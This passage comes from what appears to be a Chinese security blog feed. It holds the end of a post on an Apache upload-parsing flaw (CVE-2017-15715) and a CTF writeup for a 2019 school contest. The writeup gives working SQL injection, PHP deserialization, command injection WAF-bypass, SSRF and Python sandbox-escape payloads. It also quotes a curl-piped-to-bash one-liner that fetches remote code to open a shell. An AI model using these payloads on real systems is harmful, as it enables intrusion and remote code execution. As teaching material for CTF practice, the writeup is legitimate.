class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>验证的逻辑就是首先利用正则匹配验证后缀名是否包含了<code>php</code>，第二步就是利用黑名单过滤，但是由于未过滤<code>php%0a</code>，并且取post参数<code>name</code>作为文件名，所以便可以很好的利用到apache的解析漏洞，另外我们还可以看一下apache配置文件，文件目录在<code>/etc/apache2/conf-available/docker-php.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>正如我们前面提到的配置文件内容一样，<code>$</code>能匹配到换行符<code>\x0a</code>，这就造成了该解析漏洞</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个漏洞利用的条件如下：</p><ul><li>获取文件名时不能用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉，这一点有点鸡肋</li><li>Apache版本为<strong>2.4.0到2.4.29</strong></li><li>服务器必须是linux系统，因为windows环境下不支持后缀名带有换行符<code>\x0a</code></li></ul><p>总体上而言，只要取<code>$FILES[&#39;file&#39;][&#39;name&#39;]</code>作为文件名，就可以无视该解析漏洞，所以该漏洞总体来说实际用处不大，但是由于根本成因在于<code>$</code>，在以后的其他某些漏洞可以还有利用到的地方，作为一种姿势学习一下还是蛮有趣的。</p><p>最后附上参考链接：</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单</a></li><li><a href="https://c1h3ng.github.io/web/2018/04/10/apache-cve/" target="_blank" rel="noopener">apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制</a></li><li><a href="https://cloud.tencent.com/developer/news/338482" target="_blank" rel="noopener">Apache最新解析漏洞：CVE-2017-15715复现</a></li></ul>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019-FAFU-ctf WP</title>
    <link href="https://Foxgrin.github.io//posts/10503/"/>
    <id>https://Foxgrin.github.io//posts/10503/</id>
    <published>2019-04-29T07:15:00.000Z</published>
    <updated>2019-05-20T01:29:45.705Z</updated>
    
    <content type="html"><![CDATA[<p>第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的<a id="more"></a></p><p>所有题目都已经传到github上面了：<a href="https://github.com/Foxgrin/2019-Fafu-ctf" target="_blank" rel="noopener">https://github.com/Foxgrin/2019-Fafu-ctf</a> </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>得到flag的条件：<code>md5($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])</code></p><p>考察的是md5和sha1函数无法处理数组的特性，处理结果都是NULL</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><p>flag：<code>flag{WelCome_To_Fafu_2019_ctf}</code></p><h4 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h4><p>扫描目录发现存在<strong>.git泄露</strong></p><p>使用<strong>githack</strong>进行还原即可</p><p>还原后发现flag文件：<code>{975fdb8c8c79c7c9502834c1baf02b36}</code></p><h4 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h4><p>提示：<code>id is not in whitelist.</code></p><p>猜测注入点在参数<code>id</code>，GET传参<code>id=1</code>得到回显信息</p><p>经过fuzz测试，题目通过黑名单的方式过滤了<code>or</code>，<code>union</code>，<code>*</code>，<code>benchmark</code>，<code>sleep</code>，<code>if</code>，<code>case</code></p><p>无法使用联合注入，盲注，但是报错注入函数<code>extractvalue</code>和<code>updatexml</code>都未被过滤</p><p>尝试payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,concat(0x3a,database(),0x3a))%23</span><br></pre></td></tr></table></figure><p>发现<code>concat</code>又被过滤了，但是可以用<code>make_set</code>函数来代替</p><p>注数据库名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,database()))%23</span><br></pre></td></tr></table></figure><p>数据库名：<code>web</code></p><p>因为这里<code>or</code>被过滤了，所以无法使用<code>information_schema</code>库得到表名和列名</p><p>猜测列名flag在表名flag中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,(select flag from flag)))%23</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag{1n0rRY_i3_Vu1n3rab13}</code></p><h4 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h4><p>抓包发现响应包头部字段藏有提示字段：<code>hint: include($_GET[&quot;file&quot;])</code></p><p>提示考察文件包含，使用php伪协议读取index.php源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">header(<span class="string">'hint:include($_GET["file"])'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'heicore.html'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$pass = unserialize($pass);</span><br><span class="line"><span class="keyword">echo</span> $pass;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>file_get_contents</code>函数同样用伪协议<code>php://input</code>利用</p><p>源代码中还给了提示文件<code>class.php</code>，同样方法读取源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是一个Read类，其中魔术方法<code>__toString</code>在当对象被当做字符串时候会自动调用，调用后会执行<code>file_get_contents</code>函数读取文件，结合<code>class.php</code>中的反序列化函数<code>unserialize</code>，我们可以构造对象的序列化字符来读取<code>f1a9.php</code>文件</p><p>构造序列化字符的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$r-&gt;file = <span class="string">"f1a9.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($r);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的序列化字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=class.php&amp;user=php://input&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: 172.31.19.47</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _ga=GA1.1.1968814565.1555932724; _gid=GA1.1.1377480033.1555932724</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure><h4 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h4><p>密码字段过滤了<code>&#39;</code>，<code>#</code>，<code>||</code>，<code>or</code></p><p>在用户名字段尝试<code>admin&#39;#</code>，回显的信息为：<code>Wrong username / password.</code></p><p>尝试<code>admin&#39; or 1#</code>，回显的信息为：<code>Wrong password for users</code></p><p>回显的信息不同，猜测用户名<code>admin</code>其实是不存在的，并且后台还对我们输入的密码进行了验证</p><p><code>admin&#39; union select 1,2#</code>，回显信息：<code>Wrong password for 1</code></p><p>有注入点，开始常规注入，数据库名为<code>fafuctf</code>，表名为<code>users</code>，列名为<code>username,password</code></p><p>注password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(password),2 from users#&amp;password=1</span><br></pre></td></tr></table></figure><p>password：<code>8235020a76bf2f8e3e30c500c3f309220d26c544</code></p><p>同样的方法注出用户名为：<code>users</code></p><p>尝试登陆但是失败，观察密码字段</p><p>猜测密码字段经过加密，从40位字符可以猜到是<code>sha1</code>加密，结合前面的分析，可以猜测出，后台进行的密码验证为<code>$row[&#39;password&#39;] === sha1($_POST[&#39;password&#39;])</code></p><p>我们可以通过union构造password字段的查询值，所以最终payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select 1,sha1(2)#&amp;password=2</span><br></pre></td></tr></table></figure><p>flag：<code>flag{SqLi_InjEc4ion_Is_So_E@Sy}</code></p><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4><p>扫描后台发现存在备份文件<code>www.zip</code></p><p>审计源码，网站目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">html tree</span><br><span class="line">.</span><br><span class="line">├── passage</span><br><span class="line">│ ├── title.php</span><br><span class="line">│ ├── words.php</span><br><span class="line">├── templates</span><br><span class="line">│ ├── About.php</span><br><span class="line">│ ├── Flag.php</span><br><span class="line">│ ├── Link.php</span><br><span class="line">│ ├── passage.php</span><br><span class="line">├── class.php</span><br><span class="line">├── index.php</span><br><span class="line">├── waf.php</span><br></pre></td></tr></table></figure><p>审计源码</p><p>在index.php中，发现可以通过参数<code>$_GET[&#39;page&#39;]</code>执行命令，但是该参数经过waf和<code>file_exists</code>的过滤处理，</p><p>所以无法通过<code>$_GET[&#39;page&#39;]</code>函数执行命令</p><p>另外发现了反序列化函数，猜测可以构建类，正好根目录下存在文件<code>class.php</code></p><p>跟踪<code>class.php</code>，虽然同样有waf，但是可以绕过，最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Passge&amp;tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:26:&quot;%26/bin/ca?%09./templates/Flag&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: 172.31.19.53</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">you got this</span><br></pre></td></tr></table></figure><p>这个payload其实使用了统配符来绕过WAF，在linux下，/bin/ca? 相当于/bin/cat 。由于过滤了符号 ‘&lt;’ 和空格，所以无法使用 cat ./templates/Flag ，但是我们可以使用%09（Tab）来替换空格，绕过WAF。</p><p>另外要注意的是<code>file</code>值<code>%26/bin/ca?%09./templates/Flag</code>的长度，<code>%26</code>会被URL解码为<code>&amp;</code>，<code>%09</code>会被解码会<code>Tab</code>，所以<code>%26</code>和<code>%09</code>长度都相当于1</p><p>赛后从福大师傅那里得知单引号能绕过黑名单过滤<code>ca&#39;&#39;t</code>，他们给的payload是<code>tips=O:4:&quot;Blog&quot;:1:{s:4:&quot;file&quot;;s:18:&quot;%;c&#39;&#39;at%09./waf.php;&quot;;}</code></p><p>另外福大师傅还有<code>;cu&#39;&#39;rl\$IFS\$9{x.x.x.x}|bash;</code>直接拿shell的方法</p><h4 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h4><p>注册信息后，在<code>view.php</code>页面，发现url存在参数<code>no</code>存在sql注入，过滤了<code>union select</code>，采用<code>/**/</code>代替空格</p><ul><li>注库：<code>?no=0%20union/**/select%201,database(),3,4</code></li><li>注表：<code>?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()</code></li><li>注列：<code>?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27</code></li><li>注data：<code>?no=0%20union/**/select%201,data,3,4%20from%20users</code></li></ul><p>发现data是一串序列化字符串，并且给出了类的所有信息，结合页面<code>age</code>和<code>blog</code>字段无法显示以及反序列化函数报错信息，猜测后台将<code>data</code>信息取出进行了反序列化处理，并且，在页面下方通过<code>iframe</code>标签将博客页面访问出来，说明可能利用了php的<code>curl</code>扩展对我们注册的博客信息进行请求，并将请求获得的页面内容通过<code>iframe</code>标签显示出来，说明可能存在<code>SSRF</code>漏洞，其原理与读取文件类似，我们通过报错信息知道了网站的绝对目录，便可以利用<code>file</code>协议进行读取任意文件，但是要注意需要序列化处理</p><p>最终获得flag的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0%20union/**/select%201,data,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27%20from%20users</span><br></pre></td></tr></table></figure><p>将得到的页面内容进行base64解密后获得flag</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="字符偏移"><a href="#字符偏移" class="headerlink" title="字符偏移"></a>字符偏移</h4><p>考察 Linux 文件重定向  <code>flag{You_F0und_4_Supr1s3_1n_These_Bug5:)}</code></p><ul><li><p>环境部署：</p><p>1.服务端运行 <code>python server.py</code>， 并修改 client.c 中的 ip 和 port<br>2.编译 <code>gcc client.c -o bugProgram</code> 并下发</p></li><li><p>题解：</p><ol><li>./bugProgram 1&gt;/dev/null 即可得到 flag</li><li>也可以 wireshark 抓取流量, 再分析程序流程还原 flag</li></ol></li></ul><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>考察 Python3 沙盒绕过    <code>flag{Awes0me_Pyth0n_&amp;_Aw3s0me_Cl4ss}</code></p><ul><li>环境部署：<ol><li>修改 flag 权限防止搅屎 <code>chmod o-w flag.txt</code></li><li>服务端执行 <code>socat tcp-listen:8999,fork exec:&quot;./run.sh&quot;,stderr</code></li><li>做题通过 <code>nc ip 8999</code></li></ol></li><li>题解：<ul><li>Fuzz 之后发现限制了 import system os bash sh 等关键字, 使用 Python 内建函数以及类的继承绕过限制, 执行 cat flag.txt. Payload:<br><code>print(&#39;&#39;.&#39;&#39;.__class__.__mro__[1].__subclasses__()[93].__init__.__globals__[&#39;sys&#39;].modules[&#39;o&#39;+&#39;s&#39;].spawnlp(0, &#39;cat&#39;, &#39;cat&#39;, &#39;flag&#39;))</code><br>其中 <code>__subclasses__()[93]</code> 是 <code>&lt;class &#39;codecs.StreamReaderWriter&#39;&gt;</code> 的索引， 视具体情况而定<br><code>s = &#39;&#39;.__class__.__mro__[1].__subclasses__()</code><br><code>for i in s: print(str(i) + &#39; &#39; + str(s,index(i)))</code></li></ul></li></ul><h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><p>考察png的基本格式<br>首先把图片开头的几个nop删掉，然后得到图片<br>之后修改图片宽度，得到写有flag的图片<br>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">256</span>):</span><br><span class="line">    b=hex(i)[<span class="number">2</span>:]</span><br><span class="line">    a=(<span class="string">'89504E470D0A1A0A0000000D49484452000003'</span>+b+<span class="stringspan>).decode(<span class="string">"hex"</span>)</span><br><span class="line">    f=open(<span class="string">'1\\'</span>+b+<span class="string">'.png'</span>,<span class="string">"wb"</span>)</span><br><span class="line">    f.write(a)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>考察 IDAPatch 的使用     <code>flag{why_need_so_large_ram_emmmmmmm}</code></p><ul><li><p>环境搭建：</p><ol><li>直接下发 <code>fakeRam</code> 程序</li></ol></li><li><p>题解：</p><p>利用 IDAPatch nop 掉所有严重与等待后重新运行即可自动输出 flag</p></li></ul><h4 id="c-STL"><a href="#c-STL" class="headerlink" title="c++STL"></a>c++STL</h4><p>考察c++STL容器基础</p><p>开始创建三个vector容器<br>第一个放入输入的16个数字<br>第二个放入从500开始的16个素数<br>第三个倒序放入第一个容器的16个数字<br>比较第三和第二个容器<br>相等则得到flag</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h4 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">sssk=string.printable</span><br><span class="line">text2=<span class="string">"sha256_is_too_"</span></span><br><span class="line">text1=<span class="string">"6348306011488e60120a6b99fbbb13f09336235fb790f8f904e97846b1418e48"</span></span><br><span class="line"><span class="comment">#sha256_is_too_e@$Y</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> sssk:</span><br><span class="line"><span class="keyword">for</span> i2 <span class="keyword">in</span> sssk:</span><br><span class="line"><span class="keyword">for</span> i3 <span class="keyword">in</span> sssk:</span><br><span class="line"><span class="keyword">for</span> i4 <span class="keyword">in</span> sssk:</span><br><span class="line">text3=text2+i1+i2+i3+i4</span><br><span class="line"><span class="keyword">if</span> sha256(text3).hexdigest()==text1:</span><br><span class="line">text4=i1+i2+i3+i4</span><br><span class="line"><span class="keyword">print</span> i1+i2+i3+i4</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> text3</span><br></pre></td></tr></table></figure><p>得到flag</p><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>考察简化的DES差分分析</p><figure class="highlight python"><figcaption><span>round1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SBOX = [[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]</span></span><br><span class="line"><span 